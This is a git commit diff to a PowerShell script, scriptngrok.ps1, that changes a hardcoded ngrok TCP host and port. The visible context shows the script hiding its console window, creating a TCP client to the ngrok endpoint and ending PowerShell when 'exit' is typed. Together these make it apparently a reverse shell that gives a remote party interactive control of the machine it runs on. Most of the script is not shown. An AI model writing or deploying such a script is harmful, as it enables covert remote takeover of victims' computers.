9f79cfeecbdfd1fff8839b0fb9229fd7055742d7
Tretas999 <Tretas0999@gmail.com>
2025-09-11 09:48:23 +0100

    Update scriptngrok.ps1

--- scriptngrok.ps1
+++ scriptngrok.ps1
@@ -16,8 +16,8 @@ $hwnd = [WinAPI]::GetConsoleWindow()
 # -----------------------------
 # CONFIGURAÇÕES NGROK
 # -----------------------------
-$ngrokHost = "6.tcp.eu.ngrok.io"
-$ngrokPort = 12907
+$ngrokHost = "0.tcp.eu.ngrok.io"
+$ngrokPort = 18571
 
 # -----------------------------
 # CRIAR TCP CLIENTE
@@ -72,6 +72,7 @@ try {
 # ENCERRA POWERHELL AO DIGITAR exit
 # -----------------------------
 Stop-Process -Id $PID -Force
+
 
 
 
